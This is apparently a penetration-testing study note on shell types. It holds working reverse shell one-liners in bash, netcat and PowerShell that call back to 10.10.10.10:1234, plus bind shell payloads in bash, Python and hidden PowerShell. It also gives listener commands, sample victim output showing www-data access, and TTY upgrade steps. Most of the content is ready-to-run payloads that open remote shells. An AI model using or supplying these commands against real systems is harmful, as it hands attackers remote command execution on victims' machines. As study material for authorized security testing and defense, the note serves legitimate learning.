# Types of Shells

Three main types:
- Reverse Shell: Connects back to our system and gives us control through a reverse connection.
- Bind Shell: Waits for us to connect to it and gives us control once we do.
- Web Shell: Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.

## Reverse Shell

#### Create a listener

create a netcat listened on a port to connect on:
```
nc -lvnp 1234

listening on [any] 1234 ...
```

The flags we are using are the following:
Flag 	Description
- `-l`: Listen mode, to wait for a connection to connect to us.
- `-v`: Verbose mode, so that we know when we receive a connection.
- `-n`: Disable DNS resolution and only connect from/to IPs, to speed up the connection.
- `-p 1234`: Port number netcat is listening on, and the reverse connection should be sent to.

Now that we have a netcat listener waiting for a connection, we can execute the reverse shell command that connects to us.

#### create the reverse shell

reverse shell cheatsheet: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/

examples:
linux bash tcp: `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`
not sure: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f`
windows powershell: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"`

#### the connection

netcat example connection:
```
nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Bind Shell

Unlike a Reverse Shell that connects to us, we will have to connect to it on the targets' listening port.

bind shell cheatsheet: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/

#### connection setup on victim

examples:
bash: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f`
python: `python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'`
windows powershell: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();`

#### netcat connection

```
nc 10.10.10.1 1234

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

Unlike a Reverse Shell, if we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately. However, if the bind shell command is stopped for any reason, or if the remote host is rebooted, we would still lose our access to the remote host and will have to exploit it again to gain access.

---

## Upgrading TTY (shell capabilities)

`python -c 'import pty; pty.spawn("/bin/bash")'`
+
`[Ctrl+Z]`
+
`stty raw -echo`
+
`fg`
+
`[Enter]` + `[Enter]`